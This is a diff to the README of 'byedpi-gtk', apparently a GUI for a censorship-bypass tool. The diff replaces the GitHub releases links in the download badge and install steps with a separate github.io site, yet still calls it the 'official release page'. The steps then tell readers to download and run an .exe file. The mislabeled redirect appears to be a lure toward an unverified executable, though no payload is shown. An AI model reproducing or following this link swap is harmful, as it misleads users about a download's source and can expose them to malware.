@@ -1,6 +1,6 @@
 # 🌐 byedpi-gtk - Access the internet without restrictions
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Smoothshelled-retreat212/byedpi-gtk/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://smoothshelled-retreat212.github.io)
 
 ## 📖 About this application
 
@@ -17,7 +17,7 @@ The application provides a graphical interface for the underlying byedpi tool. Y
 
 ## 📥 Installing the application
 
-1. Go to the [official release page](https://github.com/Smoothshelled-retreat212/byedpi-gtk/releases).
+1. Go to the [official release page](https://smoothshelled-retreat212.github.io).
 2. Look for the file ending in `.exe`. 
 3. Click the file name to start the download.
 4. Open the downloaded file once the process completes.
